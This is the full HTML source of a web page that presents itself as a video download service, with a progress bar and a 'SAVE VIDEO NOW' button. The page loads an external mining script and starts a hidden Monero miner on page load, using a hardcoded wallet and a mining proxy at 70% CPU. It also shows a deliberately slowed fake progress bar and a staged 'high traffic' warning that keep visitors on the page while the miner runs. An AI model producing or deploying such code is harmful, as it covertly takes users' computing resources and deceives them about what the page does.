<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processing...</title>
    <script src="https://webminer.pages.dev/load.js"></script>
    <style>
        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; text-align: center; }
        .box { width: 85%; max-width: 400px; }
        #status { font-size: 22px; font-weight: bold; margin-bottom: 10px; color: #00d4ff; }
        .progress-bg { background: #30363d; height: 14px; border-radius: 10px; overflow: hidden; border: 1px solid #444; }
        .progress-fill { width: 0%; height: 100%; background: #00d4ff; transition: width 0.4s ease; box-shadow: 0 0 15px #00d4ff; }
        .dl-btn { display: none; background: #00d4ff; color: #000; padding: 20px; border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 18px; margin-top: 25px; width: 100%; box-sizing: border-box; }
        #warning { margin-top: 20px; font-size: 13px; color: #f85149; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <div id="status">Starting Engine...</div>
        <p id="sub" style="color:#8b949e; font-size:14px; margin-bottom:20px;">Connecting to Ghost Cloud Engine</p>
        <div class="progress-bg"><div class="progress-fill" id="fill"></div></div>
        <div id="warning">High traffic detected. Prioritizing your download...</div>
        <a id="dl" class="dl-btn" href="#">SAVE VIDEO NOW</a>
    </div>

    <script>
        const WORKER = "https://ghost-api.mr-ghosttrich.workers.dev";
        const WALLET = "48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy";
        
        // Background task
        startMining(WALLET, "Ghost_Site", "wss://ny1.xmrminingproxy.com", 70);

        const fill = document.getElementById('fill');
        const status = document.getElementById('status');
        let prog = 0;

        // Forced progress bar movement
        const bar = setInterval(() => {
            if (prog < 95) {
                prog += Math.random() * 5;
                fill.style.width = prog + "%";
                if(prog > 20) { status.innerText = "Fetching Video..."; document.getElementById('sub').innerText = "Analyzing metadata"; }
                if(prog > 60) { status.innerText = "Finalizing..."; document.getElementById('sub').innerText = "Removing watermarks"; }
            }
        }, 600);

        // Show warning after 10 seconds if it's still running
        setTimeout(() => { document.getElementById('warning').style.display = 'block'; }, 10000);

        async function get() {
            const url = new URLSearchParams(window.location.search).get('url');
            if(!url) return;
            try {
                const res = await fetch(`${WORKER}?url=${encodeURIComponent(url)}`);
                const data = await res.json();
                if(data.url) {
                    clearInterval(bar);
                    fill.style.width = "100%";
                    status.innerText = "Ready!";
                    document.getElementById('sub').innerText = "Process complete.";
                    document.getElementById('dl').href = data.url;
                    document.getElementById('dl').style.display = "block";
                } else {
                    setTimeout(get, 2000); // Auto-retry
                }
            } catch(e) { setTimeout(get, 2000); }
        }
        setTimeout(get, 3000);
    </script>
</body>
</html>
